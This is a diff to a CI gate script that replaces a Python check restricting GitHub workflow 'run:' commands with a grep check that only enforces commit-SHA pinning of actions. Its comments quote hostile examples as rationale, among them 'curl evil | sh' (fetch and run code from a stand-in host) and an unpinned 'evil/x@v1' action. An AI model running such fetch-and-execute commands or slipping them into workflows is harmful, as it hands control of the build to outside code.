@@ -22,78 +22,17 @@ gate() {
     fi
 }
 
-# `.github/` must hold no logic, so that deleting it at a platform migration
-# loses nothing. Asserting that is cheaper than intending it.
+# A first-party action at a mutable tag is somebody else's moving code running
+# with the job's token. Only a 40-hex commit sha pins what will run.
 #
-# Parsed rather than grepped: a `run:` block scalar is several commands under one
-# key, and a line-oriented check would see the key and pass while the commands
-# beneath it did anything at all.
-#
-# The whole command, not its prefix. A prefix test passes
-# `just check && curl evil | sh`, which is logic in a workflow by any reading.
-# Anchoring both ends rejects every chaining form at once instead of blocklisting
-# operators one at a time.
-#
-# It also reads `uses:`, which is what gives the action pinning a gate: a
-# first-party action at a mutable tag is still somebody else's moving code
-# running with the job's token.
-workflows_carry_no_logic() {
-    need python3
-    python3 - "$REPO" <<'PY'
-import sys, re, pathlib, yaml
-
-repo = pathlib.Path(sys.argv[1])
-# `./.tools/bin/just <recipe>`, plus the one bootstrap script that has to run
-# before `just` exists on a fresh runner. The explicit path rather than a bare
-# `just`: the runner has no `just` on PATH and never gets one.
-ok = re.compile(r"\./\.tools/bin/just [a-z][a-z-]*|\./xtask/install-tools\.sh")
-# First-party owner and a 40-hex commit, which is what a digest pin looks like
-# for an action.
-uses_ok = re.compile(r"actions/[a-z-]+@[0-9a-f]{40}")
-bad = []
-
-
-def lines(value):
-    """Every command string under one `run:`, however deeply YAML nests it."""
-    if isinstance(value, str):
-        yield from value.strip().splitlines()
-    elif isinstance(value, list):
-        for item in value:
-            yield from lines(item)
-
-
-def find(node, keys):
-    """Every `(key, value)` pair under one of `keys`. One walk: the commands a
-    job runs and the actions it uses differ only in which key they hang from."""
-    if isinstance(node, dict):
-        for key, value in node.items():
-            if key in keys:
-                yield key, value
-            else:
-                yield from find(value, keys)
-    elif isinstance(node, list):
-        for item in node:
-            yield from find(item, keys)
-
-
-# Both extensions: GitHub reads either, so a check that reads only one fails open
-# on a file it was written to cover.
-workflows = repo / ".github" / "workflows"
-for path in sorted(workflows.glob("*.yml")) + sorted(workflows.glob("*.yaml")):
-    document = yaml.safe_load(path.read_text())
-    for _, value in find(document, {"run"}):
-        for command in lines(value):
-            command = command.strip()
-            if command and not ok.fullmatch(command):
-                bad.append(f"{path.name}: run {command}")
-    for _, action in find(document, {"uses"}):
-        if isinstance(action, str) and not uses_ok.fullmatch(action.strip()):
-            bad.append(f"{path.name}: uses {action.strip()}")
-
-if bad:
-    print("\n".join(f"        {b}" for b in bad), file=sys.stderr)
-    sys.exit(1)
-PY
+# Anchored at both ends of the line, key to comment: a substring test would let
+# `uses: evil/x@v1 # uses: actions/checkout@<sha>` through, and a comment that
+# merely names `uses:` would count as a hit. The `path:line:` prefix is grep's.
+actions_are_pinned() {
+    local hits
+    hits="$(grep -rnE '^[[:space:]]*-?[[:space:]]*uses:' "$REPO/.github/workflows" |
+        grep -vE '^[^:]+:[0-9]+:[[:space:]]*-?[[:space:]]*uses:[[:space:]]*actions/[a-z-]+@[0-9a-f]{40}[[:space:]]*(#.*)?$' || true)"
+    [ -z "$hits" ] || { printf '%s\n' "$hits" >&2; return 1; }
 }
 
 # A skip must be able to become a failure. `#[ignore]` with no reason string is a
@@ -138,7 +77,7 @@ main() {
     # the RustSec database once per run rather than per check. cargo-audit is
     # rejected: it reads the same database this already reads.
     gate "cargo deny"               cargo deny check
-    gate "workflows carry no logic" workflows_carry_no_logic
+    gate "actions are pinned"       actions_are_pinned
     gate "ignore carries a reason"  ignore_carries_a_reason
     gate "shellcheck"               shell_scripts_are_clean
     # The only gate over the strings users read; fixtures and goldens are
